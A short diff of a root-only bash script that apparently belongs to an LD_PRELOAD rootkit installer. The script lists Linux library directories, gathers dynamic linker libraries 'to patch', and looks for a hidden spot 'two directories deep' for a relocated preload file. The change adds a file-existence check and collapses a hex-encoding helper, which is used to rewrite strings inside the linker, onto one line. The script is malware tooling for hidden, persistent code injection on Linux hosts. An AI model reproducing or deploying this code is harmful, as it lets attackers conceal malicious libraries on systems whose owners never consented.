@@ -3,16 +3,12 @@
 [ $(id -u) != 0 ] && exit
 [ -z $1 ] && exit
 O_PRELOAD="$1"
+[ ! -f $O_PRELOAD ] && exit
 LDIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
 PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")
 LLOCS=() # later stores paths of dynamic linker libraries to patch
 
-# return input '$1' as uppercase string of hex
-hstr()
-{
-  local HS="`xxd -p <<< "$1"`"
-  echo -n "${HS::-2}00" | awk '{print toupper($0)}'
-}
+hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::-2}00" | awk '{print toupper($0)}'; }
 
 # `gnpreload` uses this function to seek a home, for the npreload file, two directories deep
 grecurdir()
